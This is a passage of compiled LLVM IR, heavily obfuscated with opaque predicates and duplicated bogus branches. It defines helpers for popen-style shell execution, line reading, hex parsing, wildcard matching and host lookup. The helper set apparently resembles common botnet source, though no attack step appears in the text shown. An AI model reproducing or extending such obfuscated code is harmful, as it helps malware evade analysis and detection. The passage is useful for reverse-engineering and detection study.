  %272 = load i8*, i8** %4, align 8
  %273 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.68, i32 0, i32 0), i8* %272, i8* null) #2
  call void @_exit(i32 127) #12
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %197
  %274 = load i8*, i8** %5, align 8
  %275 = load i8, i8* %274, align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 114
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %218
  %278 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %279 = load i32, i32* %278, align 4
  store i32 %279, i32* %6, align 4
  %280 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %281 = load i32, i32* %280, align 4
  %282 = call i32 @close(i32 %281)
  br label %originalBB26
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %94

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %58, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %58

; <label>:38:                                     ; preds = %35
  %39 = load i32, i32* @x.21
  %40 = load i32, i32* @y.22
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %38
  %47 = call i32* @__errno_location() #13
  %48 = load i32, i32* %47, align 4
  %49 = icmp eq i32 %48, 4
  %50 = load i32, i32* @x.21
  %51 = load i32, i32* @y.22
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %58

; <label>:58:                                     ; preds = %originalBBpart2, %35
  %59 = phi i1 [ false, %35 ], [ %49, %originalBBpart2 ]
  br i1 %59, label %28, label %60

; <label>:60:                                     ; preds = %58
  %61 = load i32, i32* @x.21
  %62 = load i32, i32* @y.22
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %60
  %69 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %70 = load i32*, i32** @fdopen_pids, align 8
  %71 = load i32, i32* %4, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i32, i32* %70, i64 %72
  store i32 0, i32* %73, align 4
  %74 = load i32, i32* %8, align 4
  %75 = icmp eq i32 %74, -1
  %76 = load i32, i32* @x.21
  %77 = load i32, i32* @y.22
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %75, label %84, label %85

; <label>:84:                                     ; preds = %originalBBpart24
  br label %92

; <label>:85:                                     ; preds = %originalBBpart24
  %86 = bitcast %struct.in_addr* %9 to i32*
  %87 = load i32, i32* %7, align 4
  store i32 %87, i32* %86, align 4
  %88 = bitcast %struct.in_addr* %9 to i32*
  %89 = load i32, i32* %88, align 4
  %90 = and i32 %89, 65280
  %91 = ashr i32 %90, 8
  br label %92

; <label>:92:                                     ; preds = %85, %84
  %93 = phi i32 [ -1, %84 ], [ %91, %85 ]
  store i32 %93, i32* %2, align 4
  br label %94

; <label>:94:                                     ; preds = %92, %19
  %95 = load i32, i32* @x.21
  %96 = load i32, i32* @y.22
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i32, i32* %2, align 4
  %104 = load i32, i32* @x.21
  %105 = load i32, i32* @y.22
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %103

originalBBalteredBB:                              ; preds = %originalBB, %38
  %112 = call i32* @__errno_location() #13
  %113 = load i32, i32* %112, align 4
  %114 = icmp eq i32 %113, 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %60
  %115 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %116 = load i32*, i32** @fdopen_pids, align 8
  %117 = load i32, i32* %4, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i32, i32* %116, i64 %118
  store i32 0, i32* %119, align 4
  %120 = load i32, i32* %8, align 4
  %121 = icmp eq i32 %120, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %122 = load i32, i32* %2, align 4
  br label %originalBB6
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.23
  %5 = load i32, i32* @y.24
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %43, %originalBBpart2
  %26 = load i32, i32* %15, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %41

; <label>:28:                                     ; preds = %25
  %29 = load i32, i32* %16, align 4
  %30 = load i32, i32* %13, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %12, align 8
  %34 = load i32, i32* %16, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = getelementptr inbounds i8, i8* %36, i64 -1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 10
  br label %41

; <label>:41:                                     ; preds = %32, %28, %25
  %42 = phi i1 [ false, %28 ], [ false, %25 ], [ %40, %32 ]
  br i1 %42, label %43, label %53

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %14, align 4
  %45 = load i8*, i8** %12, align 8
  %46 = load i32, i32* %16, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = call i64 @read(i32 %44, i8* %48, i64 1)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %15, align 4
  %51 = load i32, i32* %16, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %16, align 4
  br label %25

; <label>:53:                                     ; preds = %41
  %54 = load i32, i32* %15, align 4
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %57

; <label>:56:                                     ; preds = %53
  br label %59

; <label>:57:                                     ; preds = %53
  %58 = load i8*, i8** %12, align 8
  br label %59

; <label>:59:                                     ; preds = %57, %56
  %60 = phi i8* [ null, %56 ], [ %58, %57 ]
  %61 = load i32, i32* @x.23
  %62 = load i32, i32* @y.24
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %59
  %69 = load i32, i32* @x.23
  %70 = load i32, i32* @y.24
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i8* %60

originalBBalteredBB:                              ; preds = %originalBB, %3
  %77 = alloca i8*, align 8
  %78 = alloca i32, align 4
  %79 = alloca i32, align 4
  %80 = alloca i32, align 4
  %81 = alloca i32, align 4
  store i8* %0, i8** %77, align 8
  store i32 %1, i32* %78, align 4
  store i32 %2, i32* %79, align 4
  store i32 1, i32* %80, align 4
  store i32 0, i32* %81, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %59
  br label %originalBB1
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %originalBBpart213, %1
  %5 = load i32, i32* @x.25
  %6 = load i32, i32* @y.26
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = load i8*, i8** %2, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = load i32, i32* @x.25
  %18 = load i32, i32* @y.26
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %16, label %25, label %28

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i64, i64* %3, align 8
  %27 = icmp sge i64 %26, 0
  br label %28

; <label>:28:                                     ; preds = %25, %originalBBpart2
  %29 = phi i1 [ false, %originalBBpart2 ], [ %27, %25 ]
  br i1 %29, label %30, label %56

; <label>:30:                                     ; preds = %28
  %31 = load i32, i32* @x.25
  %32 = load i32, i32* @y.26
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i64, i64* %3, align 8
  %40 = shl i64 %39, 4
  %41 = load i8*, i8** %2, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %2, align 8
  %43 = load i8, i8* %41, align 1
  %44 = zext i8 %43 to i64
  %45 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %44
  %46 = load i64, i64* %45, align 8
  %47 = or i64 %40, %46
  store i64 %47, i64* %3, align 8
  %48 = load i32, i32* @x.25
  %49 = load i32, i32* @y.26
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart213, label %originalBB1alteredBB

originalBBpart213:                                ; preds = %originalBB1
  br label %4

; <label>:56:                                     ; preds = %28
  %57 = load i64, i64* %3, align 8
  ret i64 %57

originalBBalteredBB:                              ; preds = %originalBB, %4
  %58 = load i8*, i8** %2, align 8
  %59 = load i8, i8* %58, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp ne i32 %60, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %62 = load i64, i64* %3, align 8
  %_ = sub i64 0, %62
  %gen = add i64 %_, 4
  %_2 = sub i64 0, %62
  %gen3 = add i64 %_2, 4
  %_4 = sub i64 0, %62
  %gen5 = add i64 %_4, 4
  %_6 = sub i64 %62, 4
  %gen7 = mul i64 %_6, 4
  %63 = shl i64 %62, 4
  %64 = load i8*, i8** %2, align 8
  %65 = getelementptr inbounds i8, i8* %64, i32 1
  store i8* %65, i8** %2, align 8
  %66 = load i8, i8* %64, align 1
  %67 = zext i8 %66 to i64
  %68 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %67
  %69 = load i64, i64* %68, align 8
  %_8 = sub i64 0, %63
  %gen9 = add i64 %_8, %69
  %_10 = sub i64 %63, %69
  %gen11 = mul i64 %_10, %69
  %70 = or i64 %63, %69
  store i64 %70, i64* %3, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %102 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %69
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %156

; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %49

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %47

; <label>:24:                                     ; preds = %19
  %25 = load i32, i32* @x.27
  %26 = load i32, i32* @y.28
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = load i8*, i8** %4, align 8
  %34 = load i8*, i8** %5, align 8
  %35 = getelementptr inbounds i8, i8* %34, i64 1
  %36 = call i32 @wildString(i8* %33, i8* %35)
  %37 = icmp ne i32 %36, 0
  %38 = xor i1 %37, true
  %39 = load i32, i32* @x.27
  %40 = load i32, i32* @y.28
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2, %19
  %48 = phi i1 [ false, %19 ], [ %38, %originalBBpart2 ]
  br label %49

; <label>:49:                                     ; preds = %47, %13
  %50 = phi i1 [ true, %13 ], [ %48, %47 ]
  %51 = load i32, i32* @x.27
  %52 = load i32, i32* @y.28
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %49
  %59 = xor i1 %50, true
  %60 = zext i1 %59 to i32
  store i32 %60, i32* %3, align 4
  %61 = load i32, i32* @x.27
  %62 = load i32, i32* @y.28
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart211, label %originalBB7alteredBB

originalBBpart211:                                ; preds = %originalBB7
  br label %156

; <label>:69:                                     ; preds = %2
  %70 = load i8*, i8** %5, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %82

; <label>:74:                                     ; preds = %69
  %75 = load i8*, i8** %4, align 8
  %76 = getelementptr inbounds i8, i8* %75, i64 1
  %77 = load i8*, i8** %5, align 8
  %78 = getelementptr inbounds i8, i8* %77, i64 1
  %79 = call i32 @wildString(i8* %76, i8* %78)
  %80 = icmp ne i32 %79, 0
  %81 = xor i1 %80, true
  br label %82

; <label>:82:                                     ; preds = %74, %69
  %83 = phi i1 [ false, %69 ], [ %81, %74 ]
  %84 = load i32, i32* @x.27
  %85 = load i32, i32* @y.28
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %82
  %92 = xor i1 %83, true
  %93 = zext i1 %92 to i32
  store i32 %93, i32* %3, align 4
  %94 = load i32, i32* @x.27
  %95 = load i32, i32* @y.28
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart220, label %originalBB13alteredBB

originalBBpart220:                                ; preds = %originalBB13
  br label %156

; <label>:102:                                    ; preds = %2
  %103 = load i32, i32* @x.27
  %104 = load i32, i32* @y.28
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %102
  %111 = load i8*, i8** %4, align 8
  %112 = load i8, i8* %111, align 1
  %113 = zext i8 %112 to i32
  %114 = call i32 @toupper(i32 %113) #10
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = call i32 @toupper(i32 %117) #10
  %119 = icmp eq i32 %114, %118
  %120 = load i32, i32* @x.27
  %121 = load i32, i32* @y.28
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %119, label %128, label %136

; <label>:128:                                    ; preds = %originalBBpart224
  %129 = load i8*, i8** %4, align 8
  %130 = getelementptr inbounds i8, i8* %129, i64 1
  %131 = load i8*, i8** %5, align 8
  %132 = getelementptr inbounds i8, i8* %131, i64 1
  %133 = call i32 @wildString(i8* %130, i8* %132)
  %134 = icmp ne i32 %133, 0
  %135 = xor i1 %134, true
  br label %136

; <label>:136:                                    ; preds = %128, %originalBBpart224
  %137 = phi i1 [ false, %originalBBpart224 ], [ %135, %128 ]
  %138 = load i32, i32* @x.27
  %139 = load i32, i32* @y.28
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %136
  %146 = xor i1 %137, true
  %147 = zext i1 %146 to i32
  store i32 %147, i32* %3, align 4
  %148 = load i32, i32* @x.27
  %149 = load i32, i32* @y.28
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart234, label %originalBB26alteredBB

originalBBpart234:                                ; preds = %originalBB26
  br label %156

; <label>:156:                                    ; preds = %originalBBpart234, %originalBBpart220, %originalBBpart211, %9
  %157 = load i32, i32* @x.27
  %158 = load i32, i32* @y.28
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %156
  %165 = load i32, i32* %3, align 4
  %166 = load i32, i32* @x.27
  %167 = load i32, i32* @y.28
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %24
  %174 = load i8*, i8** %4, align 8
  %175 = load i8*, i8** %5, align 8
  %176 = getelementptr inbounds i8, i8* %175, i64 1
  %177 = call i32 @wildString(i8* %174, i8* %176)
  %178 = icmp ne i32 %177, 0
  %_ = shl i1 %178, true
  %_1 = sub i1 false, %178
  %gen = add i1 %_1, true
  %_2 = sub i1 %178, true
  %gen3 = mul i1 %_2, true
  %_4 = shl i1 %178, true
  %_5 = sub i1 %178, true
  %gen6 = mul i1 %_5, true
  %179 = xor i1 %178, true
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %49
  %_8 = sub i1 %50, true
  %gen9 = mul i1 %_8, true
  %180 = xor i1 %50, true
  %181 = zext i1 %180 to i32
  store i32 %181, i32* %3, align 4
  br label %originalBB7

originalBB13alteredBB:                            ; preds = %originalBB13, %82
  %_14 = shl i1 %83, true
  %_15 = sub i1 false, %83
  %gen16 = add i1 %_15, true
  %_17 = sub i1 %83, true
  %gen18 = mul i1 %_17, true
  %182 = xor i1 %83, true
  %183 = zext i1 %182 to i32
  store i32 %183, i32* %3, align 4
  br label %originalBB13

originalBB22alteredBB:                            ; preds = %originalBB22, %102
  %184 = load i8*, i8** %4, align 8
  %185 = load i8, i8* %184, align 1
  %186 = zext i8 %185 to i32
  %187 = call i32 @toupper(i32 %186) #10
  %188 = load i8*, i8** %5, align 8
  %189 = load i8, i8* %188, align 1
  %190 = zext i8 %189 to i32
  %191 = call i32 @toupper(i32 %190) #10
  %192 = icmp eq i32 %187, %191
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %136
  %_27 = shl i1 %137, true
  %_28 = sub i1 %137, true
  %gen29 = mul i1 %_28, true
  %_30 = shl i1 %137, true
  %_31 = sub i1 false, %137
  %gen32 = add i1 %_31, true
  %193 = xor i1 %137, true
  %194 = zext i1 %193 to i32
  store i32 %194, i32* %3, align 4
  br label %originalBB26

originalBB36alteredBB:                            ; preds = %originalBB36, %156
  %195 = load i32, i32* %3, align 4
  br label %originalBB36
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %29

; <label>:12:                                     ; preds = %2
  %13 = load i32, i32* @x.29
  %14 = load i32, i32* @y.30
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  store i32 1, i32* %3, align 4
  %21 = load i32, i32* @x.29
  %22 = load i32, i32* @y.30
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %46

; <label>:29:                                     ; preds = %2
  %30 = load i32, i32* @x.29
  %31 = load i32, i32* @y.30
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %29
  store i32 0, i32* %3, align 4
  %38 = load i32, i32* @x.29
  %39 = load i32, i32* @y.30
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %46

; <label>:46:                                     ; preds = %originalBBpart24, %originalBBpart2
  %47 = load i32, i32* %3, align 4
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %12
  store i32 1, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %29
  store i32 0, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
